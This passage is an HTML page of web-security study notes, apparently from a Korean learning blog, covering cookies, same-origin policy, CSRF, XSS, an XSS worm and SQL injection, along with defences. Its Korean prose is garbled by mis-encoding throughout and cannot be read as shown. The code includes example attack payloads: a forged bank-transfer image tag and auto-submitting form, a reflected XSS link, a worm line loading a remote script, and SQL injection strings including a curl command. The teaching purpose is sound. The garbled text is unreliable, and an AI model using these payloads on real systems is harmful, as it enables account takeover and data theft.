<!doctype html><html>
<head>
<title>ë„¤íŠ¸ì›Œí¬ ë° ì›¹ ë³´ì•ˆ</title>
<meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1">
<meta name=description content="Web Security Model Web ë³´ì•ˆì˜ ëª©í‘œ  Integirty : ë¬´ê²°ì„± Confidentiality : ê¸°ë°€ì„±  HTTP  URL  https:// â€¦">
<meta property="og:site_name" content="bong-u/til">
<meta property="og:title" content="ë„¤íŠ¸ì›Œí¬ ë° ì›¹ ë³´ì•ˆ">
<meta property="og:description" content="Web Security Model Web ë³´ì•ˆì˜ ëª©í‘œ  Integirty : ë¬´ê²°ì„± Confidentiality : ê¸°ë°€ì„±  HTTP  URL  https:// â€¦">
<meta property="og:type" content="blog">
<meta property="og:url" content="https://github.com/bong-u/til-hugo">
<meta property="og:image" content="https://bong-u.github.io/til/asset/profile.jpg">
<script type=text/javascript src=https://bong-u.github.io/til/script/base.js></script>
<link rel=icon href=https://bong-u.github.io/til/favicon16.png sizes=16x16>
<link rel=icon href=https://bong-u.github.io/til/favicon32.png sizes=32x32>
<link rel=icon href=https://bong-u.github.io/til/favicon48.png sizes=48x48>
<link rel=icon href=https://bong-u.github.io/til/favicon64.png sizes=64x64>
<link id=twCSS rel=stylesheet href=https://bong-u.github.io/til/css/style.css>
<script id=MathJax-script async src=https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-svg.js></script>
<script>MathJax={tex:{inlineMath:[['$','$']]}}</script>
<script async src="https://www.googletagmanager.com/gtag/js?id=G-HE9FQR1ML7"></script>
<script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-HE9FQR1ML7')</script>
</head>
<body class=custom-scroll>
<div class="flex w-full flex-col">
<script type=text/javascript src=https://bong-u.github.io/til/script/single.js></script>
<script type=text/javascript src=https://bong-u.github.io/til/script/toc.js></script>
<header class="flex block justify-center p-4 text-3xl z-10">
<div class="flex gap-3">
<a class=hover-bigger href=https://bong-u.github.io/til/>
ğŸ 
</a>
<a class=hover-bigger href=https://github.com/bong-u/til>
ğŸˆ
</a>
<label id=toggleButton class="cursor-pointer hover-bigger" for=toggleDarkMode>
â˜€ï¸
</label>
<a id=scrollButton onclick=scrollToTop() class="cursor-pointer hover-bigger">
ğŸ”½
</a>
</div>
</header>
<input type=checkbox id=toggleDarkMode onchange=toggleDarkModeHandler() hidden>
<main class="w-full lg:w-5/6 px-3 sm:px-12">
<aside class="fixed top-0 right-0 my-24 w-1/6 gap-3 px-9 hidden xl:flex text-sm overflow-hidden">
<nav id=TableOfContents>
<ul>
<li><a href=#web-security-model>Web Security Model</a>
<ul>
<li><a href=#web-ë³´ì•ˆì˜-ëª©í‘œ>Web ë³´ì•ˆì˜ ëª©í‘œ</a></li>
<li><a href=#http>HTTP</a></li>
<li><a href=#cookies>Cookies</a></li>
<li><a href=#same-origin-policy-sop>Same Origin Policy (SOP)</a></li>
<li><a href=#xmlhttprequest-xhr>XMLHttpRequest (XHR)</a></li>
<li><a href=#cors-cross-origin-resource-sharing>CORS (Cross-Origin Resource Sharing)</a></li>
<li><a href=#cookie>Cookie</a></li>
</ul>
</li>
<li><a href=#csrf-cross-site-request-forgery>CSRF (Cross Site Request Forgery)</a>
<ul>
<li></li>
</ul>
</li>
<li><a href=#xsscross-site-scripting-attack>XSS(Cross Site Scripting) Attack</a>
<ul>
<li><a href=#non-persistent-reflected-xss-attack>Non-persistent (Reflected) XSS Attack</a></li>
<li><a href=#persistent-stored-xss-attack>Persistent (Stored) XSS Attack</a></li>
<li><a href=#xssë¡œ-ë°œìƒ-ê°€ëŠ¥í•œ-í”¼í•´>XSSë¡œ ë°œìƒ ê°€ëŠ¥í•œ í”¼í•´</a></li>
<li><a href=#self-propagation-xss-worm>Self-Propagation XSS Worm</a></li>
<li><a href=#ë°©ì–´-1>ë°©ì–´</a></li>
</ul>
</li>
<li><a href=#sql-injection>SQL Injection</a>
<ul>
<li><a href=#ì˜ˆì‹œ>ì˜ˆì‹œ</a></li>
<li><a href=#ë°©ì–´-2>ë°©ì–´</a></li>
<li><a href=#blind-sql-injection>Blind SQL Injection</a></li>
</ul>
</li>
<li><a href=#shellshock-attack>ShellShock Attack</a>
<ul>
<li><a href=#set-uid-programs>Set-UID Programs</a></li>
<li><a href=#cgicommon-gateway-interface-programs>CGI(Common Gateway Interface) Programs</a></li>
</ul>
</li>
<li><a href=#environment-variables--attacks>Environment Variables & Attacks</a>
<ul>
<li><a href=#attacks-via-dynamic-linker>Attacks via Dynamic Linker</a></li>
<li><a href=#attacks-via-execution-program>Attacks via Execution Program</a></li>
<li><a href=#attacks-via-library>Attacks via Library</a></li>
<li><a href=#attacks-via-application-code>Attacks via Application Code</a></li>
<li><a href=#set-uid-approach-vs-service-approach>Set-UID Approach VS Service Approach</a></li>
</ul>
</li>
<li><a href=#clickjacking-attack>Clickjacking Attack</a>
<ul>
<li><a href=#ë°©ì–´-3>ë°©ì–´</a></li>
<li><a href=#types-of-context-integrity>Types of Context Integrity</a></li>
</ul>
</li>
<li><a href=#ssrf-server-side-request-forgery>SSRF (Server Side Request Forgery)</a>
<ul>
<li><a href=#ê³µê²©-ì„œë²„ê°€-ì‹ ë¢°ëœ-ì„œë²„ì—ì„œ-ìš”ì²­ì´-ì˜¨-ê²ƒìœ¼ë¡œ-ì°©ê°>ê³µê²© (ì„œë²„ê°€ ì‹ ë¢°ëœ ì„œë²„ì—ì„œ ìš”ì²­ì´ ì˜¨ ê²ƒìœ¼ë¡œ ì°©ê°)</a></li>
<li><a href=#ë°©ì–´-4>ë°©ì–´</a></li>
<li><a href=#xxe-xml-external-entity-injection>XXE (XML eXternal Entity) Injection</a></li>
</ul>
</li>
</ul>
</nav>
</aside>
<section class="mt-6 xl:w-5/6">
<div class="flex flex-col">
<h4 id=date>ë§ˆì§€ë§‰ ìˆ˜ì • : 2024-04-22</h4>
</div>
<div class="mb-10 whitespace-nowrap">
<div class="flex justify-between items-baseline my-4 gap-8">
<h1 id=title class="overflow-ellipsis-bundle text-3xl font-bold p-1">
ë„¤íŠ¸ì›Œí¬ ë° ì›¹ ë³´ì•ˆ
</h1>
</div>
</div>
<article id=content class="bg-inherit markdown-body flex flex-col">
<h2 id=web-security-model>Web Security Model</h2>
<h3 id=web-ë³´ì•ˆì˜-ëª©í‘œ>Web ë³´ì•ˆì˜ ëª©í‘œ</h3>
<ul>
<li>Integirty : ë¬´ê²°ì„±</li>
<li>Confidentiality : ê¸°ë°€ì„±</li>
</ul>
<h3 id=http>HTTP</h3>
<ul>
<li>URL
<blockquote>
<p>https:// <a href=http://www.example.edu>www.example.edu</a> :80 /lectures ?lec=80 #slides
protocol + hostname + port + path + query + fragment</p>
</blockquote>
</li>
</ul>
<h3 id=cookies>Cookies</h3>
<blockquote>
<p>ì„œë²„ê°€ ì›¹ ë¸Œë¼ìš°ì €ì—ê²Œ ë³´ë‚´ëŠ” ì •ë³´</p>
</blockquote>
<ul>
<li>ì—­í•  : ì„¸ì…˜ ê´€ë¦¬, ì‚¬ìš©ì ì„¤ì • ì €ì¥, ì‚¬ìš©ì ì¶”ì  ë“±</li>
</ul>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span>// ì¿ í‚¤ ì„¤ì •
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span>Set-Cookie: name=value;
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3</span>// ì¿ í‚¤ ì „ì†¡
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">4</span>Cookie: name=value;
</code></pre></div><h3 id=same-origin-policy-sop>Same Origin Policy (SOP)</h3>
<blockquote>
<p>ê°™ì€ Originì—ì„œë§Œ ë¦¬ì†ŒìŠ¤ë¥¼ ê³µìœ í•  ìˆ˜ ìˆë„ë¡ í•œë‹¤</p>
</blockquote>
<ul>
<li>Origin
<blockquote>
<p>scheme://domain:port</p>
</blockquote>
</li>
</ul>
<h4 id=domain-relaxation>Domain Relaxation</h4>
<blockquote>
<p>ì„œë¸Œ ë„ë©”ì¸ ê°„ì˜ ë¦¬ì†ŒìŠ¤ ê³µìœ </p>
</blockquote>
<ul>
<li>
<p>document.domainì„ ìˆ˜ì •í•˜ì—¬, ì„œë¸Œ ë„ë©”ì¸ ê°„ì˜ ë¦¬ì†ŒìŠ¤ ê³µìœ  ê°€ëŠ¥</p>
</li>
<li>
<p>ì˜ˆì‹œ</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span>a.domain.com -&gt; domain.com ê°€ëŠ¥
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span>a.domain.com -&gt; b.domain.com ë¶ˆê°€ëŠ¥
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3</span>a.domain.com -&gt; com ë¶ˆê°€ëŠ¥
</code></pre></div></li>
<li>
<p>ì·¨ì•½ì  : ì•…ì˜ì ì¸ ì‚¬ì´íŠ¸ê°€ document.domainì„ ìˆ˜ì •í•˜ì—¬ ì ‘ê·¼ì„ ì‹œë„í•  ìˆ˜ ìˆìŒ</p>
</li>
<li>
<p>í•´ê²°ë°©ë²• : Mozilla Public Suffix List (PSL) ì‚¬ìš©</p>
</li>
</ul>
<h4 id=broadcastchannel-api>BroadcastChannel API</h4>
<blockquote>
<p>ê°™ì€ originì˜ ë‹¤ë¥¸ context ê°„ì˜ í†µì‹ </p>
</blockquote>
<ul>
<li>ì‚¬ìš©ë²•
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>bc</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>BroadcastChannel</span>(<span style=color:#e6db74>&#39;channel&#39;</span>);
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span><span style=color:#a6e22e>bc</span>.<span style=color:#a6e22e>postMessage</span>(<span style=color:#e6db74>&#39;message&#39;</span>);
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3</span><span style=color:#a6e22e>bc</span>.<span style=color:#a6e22e>onmessage</span> <span style=color:#f92672>=</span> (<span style=color:#a6e22e>e</span>) =&gt; <span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#a6e22e>e</span>.<span style=color:#a6e22e>data</span>);
</code></pre></div></li>
</ul>
<h3 id=xmlhttprequest-xhr>XMLHttpRequest (XHR)</h3>
<blockquote>
<p>ì„œë²„ì™€ ë¹„ë™ê¸° í†µì‹ ì„ ìœ„í•œ ê°ì²´</p>
</blockquote>
<h3 id=cors-cross-origin-resource-sharing>CORS (Cross-Origin Resource Sharing)</h3>
<blockquote>
<p>ë‹¤ë¥¸ Originì˜ ë¦¬ì†ŒìŠ¤ë¥¼ ìš”ì²­í•  ë•Œ, ì„œë²„ì—ì„œ í—ˆìš©í•˜ëŠ” ì •ì±…</p>
</blockquote>
<h3 id=cookie>Cookie</h3>
<blockquote>
<p>ì„œë²„ê°€ í´ë¼ì´ì–¸íŠ¸ì—ê²Œ ë³´ë‚´ëŠ” ì •ë³´</p>
</blockquote>
<h4 id=cookie-scoping>Cookie Scoping</h4>
<ul>
<li>Domain
<blockquote>
<p>í•´ë‹¹ ë„ë©”ì¸ì€ Subdomain ë˜ëŠ” Parent Domainì— ëŒ€í•´ì„œë§Œ ì¿ í‚¤ë¥¼ ì „ì†¡</p>
</blockquote>
</li>
<li>Path
<blockquote>
<p>í•´ë‹¹ ê²½ë¡œì˜ í•˜ìœ„ ê²½ë¡œê¹Œì§€ ì¿ í‚¤ë¥¼ ì „ì†¡</p>
</blockquote>
</li>
</ul>
<h4 id=secure-cookies>Secure Cookies</h4>
<blockquote>
<p>HTTPS í”„ë¡œí† ì½œì„ ì‚¬ìš©í•  ë•Œë§Œ ì¿ í‚¤ë¥¼ ì „ì†¡</p>
</blockquote>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span>Set-Cookie: name=value; Secure
</code></pre></div><h4 id=httponly-cookies>HTTPOnly Cookies</h4>
<blockquote>
<p>JavaScriptì—ì„œ ì¿ í‚¤ì— ì ‘ê·¼í•  ìˆ˜ ì—†ë„ë¡ í•¨</p>
</blockquote>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span>Set-Cookie: name=value; HttpOnly
</code></pre></div><h2 id=csrf-cross-site-request-forgery>CSRF (Cross Site Request Forgery)</h2>
<blockquote>
<p>ë‹¤ë¥¸ ì‚¬ì´íŠ¸ì—ì„œ ìš”ì²­ì„ ìœ„ì¡°í•˜ì—¬ ê³µê²©í•˜ëŠ” ê¸°ë²•</p>
</blockquote>
<h4 id=ë°°ê²½>ë°°ê²½</h4>
<ul>
<li>íŠ¹ì • ì‚¬ìš©ìê°€ ë¡œê·¸ì¸ëœ ìƒíƒœë¼ë©´, ì‚¬ìš©ìë¥¼ í™•ì¸í•˜ê¸° ìœ„í•´ ë¸Œë¼ìš°ì €ì—ì„œ ì¿ í‚¤ì™€ í•¨ê»˜ ìš”ì²­ì„ ì „ì†¡</li>
<li>cross-siteì—ì„œë„ ì¿ í‚¤ì™€ í•¨ê»˜ ìš”ì²­ì„ ë³´ëƒˆì„ë•Œ, ì„œë²„ê°€ same-siteì¸ì§€ cross-siteì¸ì§€ í™•ì¸ì´ ë¶ˆê°€í•œ ê²½ìš° <strong>CSRF ê³µê²© ê°€ëŠ¥</strong></li>
</ul>
<h4 id=ì˜ˆìƒ-ì‹œë‚˜ë¦¬ì˜¤>ì˜ˆìƒ ì‹œë‚˜ë¦¬ì˜¤</h4>
<ul>
<li>í”¼í•´ìê°€ í˜„ì¬ ë¡œê·¸ì¸ëœ ìƒíƒœë¡œ Malicious Siteì— ì ‘ì†</li>
<li>Malicious siteì—ì„œ í”¼í•´ì ì˜ì§€ì™€ ìƒê´€ì—†ì´ ì¿ í‚¤ì™€ í•¨ê»˜ ìš”ì²­ì„ ì „ì†¡</li>
<li>GET ì˜ˆì‹œ ì½”ë“œ
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span>&lt;<span style=color:#f92672>img</span> <span style=color:#a6e22e>src</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;http://bank.com/transfer?to=attacker&amp;amount=1000&#34;</span> /&gt;
</code></pre></div></li>
<li>POST ì˜ˆì‹œ ì½”ë“œ
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span>&lt;<span style=color:#f92672>form</span> <span style=color:#a6e22e>action</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;http://bank.com/transfer&#34;</span> <span style=color:#a6e22e>method</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;post&#34;</span>&gt;
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span>  &lt;<span style=color:#f92672>input</span> <span style=color:#a6e22e>type</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;hidden&#34;</span> <span style=color:#a6e22e>name</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;to&#34;</span> <span style=color:#a6e22e>value</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;attacker&#34;</span> /&gt;
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3</span>  &lt;<span style=color:#f92672>input</span> <span style=color:#a6e22e>type</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;hidden&#34;</span> <span style=color:#a6e22e>name</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;amount&#34;</span> <span style=color:#a6e22e>value</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;1000&#34;</span> /&gt;
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">4</span>&lt;/<span style=color:#f92672>form</span>&gt;
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">5</span>&lt;<span style=color:#f92672>script</span>&gt;
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">6</span>  document.<span style=color:#a6e22e>forms</span>[<span style=color:#ae81ff>0</span>].<span style=color:#a6e22e>submit</span>();
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">7</span>&lt;/<span style=color:#f92672>script</span>&gt;
</code></pre></div></li>
</ul>
<h4 id=ë°©ì–´>ë°©ì–´</h4>
<ul>
<li>Referer Header
<blockquote>
<p>ìš”ì²­ì„ ë³´ë‚¸ í˜ì´ì§€ì˜ ì£¼ì†Œë¥¼ ë‚˜íƒ€ë‚´ëŠ” HTTP headerë¥¼ í™•ì¸í•˜ì—¬, ìš”ì²­ì„ ë³´ë‚¸ í˜ì´ì§€ê°€ ê°™ì€ ì‚¬ì´íŠ¸ì¸ì§€ í™•ì¸</p>
</blockquote>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span>Referer: http://www.example.com
</code></pre></div><ul>
<li>í•œê³„
<ul>
<li>í•´ë‹¹ fieldë¥¼ ì´ìš©í•´ì„œ ì ‘ì† ê¸°ë¡ì„ í™•ì¸ ê°€ëŠ¥ -> ê°œì¸ì •ë³´ ë³´í˜¸ ë¬¸ì œ</li>
</ul>
</li>
</ul>
</li>
<li>Same-Site Cookies
<blockquote>
<p>ì„œë²„ê°€ ì¿ í‚¤ë¥¼ ì „ì†¡í•  ë•Œ, <code>SameSite</code>ë¼ëŠ” ì¿ í‚¤ ì†ì„±ë¥¼ ì „ì†¡, same-siteì¸ì§€ cross-siteì¸ì§€ í™•ì¸í•˜ì—¬, ì„¤ì •ê°’ì— ë”°ë¼ ì¿ í‚¤ë¥¼ ì „ì†¡í•˜ì§€ ì•ŠìŒ</p>
</blockquote>
<ul>
<li>ì„¤ì • ê°’
<ul>
<li>None (ëª¨ë“  ìš”ì²­ì— ì¿ í‚¤ ì „ì†¡)</li>
<li>Strict (cross-siteëŠ” í•­ìƒ ì¿ í‚¤ ì „ì†¡í•˜ì§€ ì•ŠìŒ)</li>
<li>Lax (cross-siteëŠ” GET ìš”ì²­ì‹œì—ë§Œ ì¿ í‚¤ ì „ì†¡í•˜ì§€ ì•ŠìŒ)</li>
</ul>
</li>
</ul>
</li>
<li>Secret Token
<blockquote>
<p>íŠ¹ì • originì˜ ì²« ìš”ì²­ë•Œ, íŠ¹ì •í•œ í† í°ì„ ìƒì„±, ì´í›„ ìš”ì²­ì‹œ í•´ë‹¹ í† í°ì„ í•¨ê»˜ ì „ì†¡í•˜ì—¬, ìš”ì²­ì´ ê°™ì€ Originì—ì„œ ì˜¨ ê²ƒì¸ì§€ í™•ì¸</p>
</blockquote>
<ul>
<li>Bypassing with Clickjacking
<blockquote>
<p>ì‚¬ìš©ìê°€ ì˜ë„í•˜ì§€ ì•Šì€ í´ë¦­ì„ ìœ ë„í•˜ì—¬, CSRF ê³µê²©ì„ ìˆ˜í–‰í•˜ëŠ” ê¸°ë²•</p>
</blockquote>
<ul>
<li>ë°©ì–´
<ul>
<li>X-Frame-Options Header (ê°’ : DENY, SAMEORIGIN, ALLOW-FROM uri)
<blockquote>
<p>í•´ë‹¹ í˜ì´ì§€ë¥¼ iframeìœ¼ë¡œ ë Œë”ë§í•˜ëŠ” ê²ƒì„ ë°©ì§€</p>
</blockquote>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id=xsscross-site-scripting-attack>XSS(Cross Site Scripting) Attack</h2>
<h3 id=non-persistent-reflected-xss-attack>Non-persistent (Reflected) XSS Attack</h3>
<blockquote>
<p>ì‚¬ìš©ìì˜ ì…ë ¥ê°’ì„ ê·¸ëŒ€ë¡œ ì¶œë ¥í•˜ì—¬, ê³µê²©ìê°€ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‚½ì…í•˜ì—¬ ê³µê²©í•˜ëŠ” ê¸°ë²•</p>
</blockquote>
<ul>
<li>ì˜ˆì‹œ
<ol>
<li>query stringì„ ì‹¤í–‰í•˜ëŠ” í˜ì´ì§€ê°€ ì¡´ì¬ (innerHTML)</li>
<li>í”¼í•´ìê°€ í•´ë‹¹ ë§í¬ë¥¼ ì‹¤í–‰ => <a href="http://www.example.com/search?input=">http://www.example.com/search?input=</a>alert(â€œattackâ€);</li>
<li>í”¼í•´ìì˜ ë¸Œë¼ìš°ì €ì—ì„œ alertê°€ ì‹¤í–‰ë¨</li>
</ol>
</li>
</ul>
<h3 id=persistent-stored-xss-attack>Persistent (Stored) XSS Attack</h3>
<blockquote>
<p>ì‚¬ìš©ìì˜ ì…ë ¥ê°’ì„ DBì— ì €ì¥í•˜ì—¬, ê³µê²©ìê°€ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‚½ì…í•˜ì—¬ ê³µê²©í•˜ëŠ” ê¸°ë²•</p>
</blockquote>
<ul>
<li>ì˜ˆì‹œ
<ol>
<li>ê²Œì‹œíŒì— ê¸€ì„ ì‘ì„±í•˜ëŠ” í˜ì´ì§€ê°€ ì¡´ì¬</li>
<li>í”¼í•´ìê°€ í•´ë‹¹ í˜ì´ì§€ì— ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‚½ì…í•˜ì—¬ ê¸€ì„ ì‘ì„±</li>
<li>ë‹¤ë¥¸ ì‚¬ìš©ìê°€ í•´ë‹¹ ê¸€ì„ ì½ì„ ë•Œ, ìŠ¤í¬ë¦½íŠ¸ê°€ ì‹¤í–‰ë¨</li>
</ol>
</li>
</ul>
<h3 id=xssë¡œ-ë°œìƒ-ê°€ëŠ¥í•œ-í”¼í•´>XSSë¡œ ë°œìƒ ê°€ëŠ¥í•œ í”¼í•´</h3>
<ul>
<li>Web defacing(ì›¹í˜ì´ì§€ ë³€ì¡°)</li>
<li>Spoofing requests(ì‚¬ìš©ìì˜ ìš”ì²­ ë³€ì¡°)</li>
<li>Stealing information(ì •ë³´ íƒˆì·¨)</li>
</ul>
<h3 id=self-propagation-xss-worm>Self-Propagation XSS Worm</h3>
<blockquote>
<p>XSS ê³µê²©ì„ í†µí•´, ìë™ìœ¼ë¡œ ê³µê²©ì„ ì „íŒŒí•˜ëŠ” ê¸°ë²•</p>
</blockquote>
<ul>
<li>2ê°€ì§€ ì ‘ê·¼
<ul>
<li>DOM Approach</li>
</ul>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span style=color:#66d9ef>let</span> <span style=color:#a6e22e>jsCode</span> <span style=color:#f92672>=</span> document.<span style=color:#a6e22e>getElementById</span>(<span style=color:#e6db74>&#39;worm&#39;</span>).<span style=color:#a6e22e>innerHTML</span>;
</code></pre></div><ul>
<li>Link Approach</li>
</ul>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span style=color:#66d9ef>let</span> <span style=color:#a6e22e>jsCode</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&lt;script src=&#34;http://www.example.com/worm.js&#34;&gt;&lt;/script&gt;&#39;</span>;
</code></pre></div></li>
</ul>
<h3 id=ë°©ì–´-1>ë°©ì–´</h3>
<ul>
<li>ì…ë ¥ê°’ í•„í„°ë§ : ì‚¬ìš©ìì˜ ì…ë ¥ê°’ì„ í•„í„°ë§í•˜ì—¬, ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‹¤í–‰í•˜ì§€ ì•Šë„ë¡ í•œë‹¤</li>
<li>Encoding : ì‚¬ìš©ìì˜ ì…ë ¥ê°’ì„ ì¶œë ¥í•  ë•Œ, HTML Encodingí•˜ì—¬, ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‹¤í–‰í•˜ì§€ ì•Šë„ë¡ í•œë‹¤</li>
<li>Content Security Policy (CSP) : ì›¹í˜ì´ì§€ì—ì„œ ì‹¤í–‰ ê°€ëŠ¥í•œ ë¦¬ì†ŒìŠ¤ë¥¼ ì œí•œí•˜ì—¬, XSS ê³µê²©ì„ ë°©ì–´í•œë‹¤
<ul>
<li>ì˜ˆì‹œ (script íŒŒì¼)</li>
</ul>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span>Content-Security-Policy: script-src &#39;self&#39; example.com
</code></pre></div><ul>
<li>ì˜ˆì‹œ (inline script)</li>
</ul>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span>Content-Security-Policy: script-src &#39;nonce-2726c7f26c&#39;
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span>// allowed script
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3</span>&lt;<span style=color:#f92672>script</span> <span style=color:#a6e22e>nonce</span><span style=color:#f92672>=</span><span style=color:#e6db74>2726c7f26c</span>&gt; ... &lt;/<span style=color:#f92672>script</span>&gt;
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">4</span>// not allowed script
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">5</span>&lt;<span style=color:#f92672>script</span> <span style=color:#a6e22e>nonce</span><span style=color:#f92672>=</span><span style=color:#e6db74>42eh44jhad</span>&gt; ... &lt;/<span style=color:#f92672>script</span>&gt;
</code></pre></div></li>
</ul>
<h2 id=sql-injection>SQL Injection</h2>
<blockquote>
<p>SQL ì¿¼ë¦¬ë¥¼ ì¡°ì‘í•˜ì—¬, DBì— ëŒ€í•œ ê³µê²©ì„ ìˆ˜í–‰í•˜ëŠ” ê¸°ë²•</p>
</blockquote>
<h3 id=ì˜ˆì‹œ>ì˜ˆì‹œ</h3>
<ul>
<li>EIDì— &ldquo;EID5002'#&ldquo;ì„ ì‚½ì… -> PASSWORD ê²€ì¦ì„ ìš°ì¦</li>
</ul>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span style=color:#66d9ef>SELECT</span> NAME, SALERY, SSN
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span><span style=color:#66d9ef>FROM</span> EMPLOYEE
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3</span><span style=color:#66d9ef>WHERE</span> EID<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;EID5002&#39;</span><span style=color:#f92672>#</span><span style=color:#e6db74>&#39; AND PASSWORD=&#39;</span><span style=color:#ae81ff>1234</span><span style=color:#e6db74>&#39;;
</span></code></pre></div><ul>
<li>curlì„ ì´ìš©í•´ì„œ SQL Injection ê³µê²©</li>
</ul>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span>curl <span style=color:#e6db74>&#39;www.example.com/getdata.php?EID=a&#39;</span> OR 1<span style=color:#f92672>=</span>1&amp;PASSWORD<span style=color:#f92672>=</span><span style=color:#960050;background-color:#1e0010>&#39;</span>
</code></pre></div><h3 id=ë°©ì–´-2>ë°©ì–´</h3>
<h4 id=filtering-and-encoding-data>Filtering and Encoding data</h4>
<blockquote>
<p>SQL Injectionì—ì„œ ì“°ì´ëŠ” íŠ¹ìˆ˜ë¬¸ìë¥¼ Filtering, Encoding</p>
</blockquote>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span>$mysqli<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>real_escape_string</span>($input);
</code></pre></div><ul>
<li>í•œê³„
<ul>
<li>í•„ìš”í•œ ë¬¸ìì—´ì„ í•„í„°ë§í•  ìˆ˜ ìˆìŒ</li>
</ul>
</li>
</ul>
<h4 id=prepared-statements>Prepared Statements</h4>
<blockquote>
